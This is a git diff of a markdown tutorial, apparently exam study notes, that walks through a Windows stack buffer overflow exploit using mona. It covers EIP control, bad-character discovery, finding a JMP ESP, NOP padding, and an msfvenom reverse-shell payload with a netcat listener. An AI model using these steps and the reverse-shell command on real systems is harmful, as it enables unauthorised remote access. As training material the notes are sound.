@@ -152,11 +152,13 @@ except:
 
 When the application crashes, EIP should be equal to 41414141 (hex value of "AAAA").
 
+------
+
 ### Crash replication & controlling EIP
 
 #### Pattern
 
-Generate a cyclic pattern to find the exact offset of the crash :
+Generate a cyclic pattern to found the exact offset of the crash :
 
 ```
 # Mona
@@ -224,41 +226,104 @@ payload = ""
 
 Re-run exploit.py, EIP should be equal to 42424242 (hex value of "BBBB"). You know control EIP !
 
+------
+
 ### Finding bad characters
 
-Certain byte characters can cause issues in the development of exploits. We must run every byte through the program to see if any characters cause issues. By default, the null byte (x00) is always  considered a bad character as it will truncate shellcode when executed.
+Certain byte characters can cause issues in the development of exploits. We must run every byte through the program to see if any characters cause issues. By default, the null byte (x00) is always considered a bad character as it will truncate shellcode when executed.
 
-- !mona bytearray -b "\x00" -> copy results to payload variable
-- Re-run exploit.py
-- !mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS -> copy bad chars
-- !mona bytearray -b "\x00 + BAD_CHARS" -> copy results to payload variable
-- !mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS -> Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.
+We will send bad characters recursively and analyze if they need to be removed. Let generate the list of bad characters with mona :
+
+```
+!mona bytearray -b "\x00"
+```
+
+Copy the results in the variable "payload". And re-run exploit.py, the application should crash. Now to found those bad characters use this command :
+
+```
+!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
+```
+
+If "BadChars" are found, we need to exclude them as well.
+
+```
+!mona bytearray -b "\x00 + <BAD_CHARS>"
+
+# Example
+!mona bytearray -b "\x00\x01\x02\x03"
+```
+
+Then compare again :
+
+```
+!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
+```
+
+Repeat those two steps until the results status returns "Unmodified", this indicates that no more bad characters exist.
+
+------
 
 ### Finding a jump point 
 
+#### JMP ESP - Inside the .exe
+
 ```
-!mona jmp -r esp -cpb "BAD_CHARS"
-Choose an address and update exploit.py, setting the "retn" variable to the address, written backwards
+!mona jmp -r esp -cpb "<BAD_CHARS>"
 ```
 
-or
+#### JMP ESP - inside a DLL
 
 ```
 !mona modules
-!mona find -s "\xff\xe4" -m DLL
 ```
+
+We need to found a .dll were Rebase, SafeSEH, ASLR, NXCompat are sets to False. When you found it, run the command below to search for a JMP ESP (FFE4), inside the dll :
+
+```
+!mona find -s "\xff\xe4" -m <DLL>
+```
+
+#### Return address
+
+Choose an address in the results and update exploit.py :
+
+- Setting the "retn" variable to the address, written backwards
+
+```
+# Example
+0x625011af : "\xff\e4"
+
+# exploit.py
+retn = "\xaf\x11\x50\x62"
+```
+
+------
 
 ### Generate payload 
 
-msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "BAD_CHARS" -f py -> Copy the generated shell code setting the payload variable
+Now we generate our shellcode without the badchars that we found :
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
+```
+
+Copy the generated shellcode and update exploit.py :
+
+- Setting the "payload" variable equal to the shellcode
+
+------
 
 ### Prepend NOPs 
+
+A NOP-sled is a technique for exploiting stack buffer overflows. It solves the problem of finding the exact address of the buffer by effectively increasing the size of the target area, \x90 represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.
 
 ```
 padding = "\x90" * 16
 ```
 
-### Start nc listerner 
+------
+
+### Start a listener 
 
 ```
 nc -lvp <PORT>
